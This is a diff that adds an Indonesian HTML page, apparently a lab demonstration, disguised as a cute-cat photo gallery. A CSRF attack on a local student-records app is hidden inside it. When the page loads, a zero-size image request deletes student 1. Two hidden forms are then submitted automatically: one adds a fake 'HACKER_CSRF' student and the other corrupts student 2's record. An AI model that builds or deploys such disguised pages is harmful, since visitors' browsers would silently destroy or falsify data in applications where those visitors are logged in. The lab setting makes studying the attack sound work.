@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Foto Kucing Lucu</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #333;
+        }
+        .cat-image {
+            width: 100%;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+        .loading {
+            color: #666;
+            font-style: italic;
+        }
+        .result {
+            background: #e8f5e9;
+            padding: 10px;
+            border-radius: 5px;
+            margin-top: 20px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1> Galeri Foto Kucing Lucu</h1>
+        <p>Selamat datang di galeri foto kucing terbaik! Halaman ini akan menampilkan foto-foto kucing menggemaskan.</p>
+        
+        <div class="loading" id="loading">
+         Memuat gambar kucing...
+        </div>
+        
+        <!-- SERANGAN CSRF TERSEMBUNYI -->
+        
+        <!-- 1. Hapus siswa ID 1 (via image src) -->
+        <img src="http://127.0.0.1:5000/delete/1" 
+             alt="kucing lucu" 
+             width="0" height="0"
+             onload="showResult(' Siswa ID 1 berhasil dihapus!')">
+        
+        <!-- 2. Form tersembunyi untuk tambah siswa palsu -->
+        <form id="addBadStudent" 
+              action="http://127.0.0.1:5000/add" 
+              method="POST"
+              style="display: none;">
+            <input type="hidden" name="name" value="HACKER_CSRF">
+            <input type="hidden" name="age" value="99">
+            <input type="hidden" name="grade" value="F">
+        </form>
+        
+        <!-- 3. Form tersembunyi untuk edit siswa -->
+        <form id="editStudent" 
+              action="http://127.0.0.1:5000/edit/2" 
+              method="POST"
+              style="display: none;">
+            <input type="hidden" name="name" value="DATA_RUSAK">
+            <input type="hidden" name="age" value="0">
+            <input type="hidden" name="grade" value="X">
+        </form>
+        
+        <!-- Gambar kucing asli -->
+        <img src="https://cataas.com/cat" 
+             alt="Kucing Lucu" 
+             class="cat-image"
+             onload="document.getElementById('loading').style.display='none'">
+        
+        <div class="result" id="result">
+            <!-- Hasil serangan akan muncul di sini -->
+        </div>
+        
+        <script>
+            // Jalankan serangan CSRF saat halaman dimuat
+            window.onload = function() {
+                console.log(" Memulai serangan CSRF...");
+                
+                // Delay sedikit untuk halaman terload sempurna
+                setTimeout(function() {
+                    // 1. Submit form tambah siswa palsu
+                    document.getElementById('addBadStudent').submit();
+                    console.log(" Menambahkan siswa palsu...");
+                    
+                    // 2. Submit form edit siswa
+                    setTimeout(function() {
+                        document.getElementById('editStudent').submit();
+                        console.log(" Mengedit siswa ID 2...");
+                        showResult(' Semua siswa berhasil dimodifikasi!');
+                    }, 1000);
+                    
+                }, 500);
+            };
+            
+            function showResult(message) {
+                const resultDiv = document.getElementById('result');
+                resultDiv.innerHTML = message;
+                resultDiv.style.display = 'block';
+            }
+        </script>
+        
+        <p><small>© 2024 Galeri Kucing. Semua hak dilindungi undang-undang.</small></p>
+    </div>
+</body>
+</html>
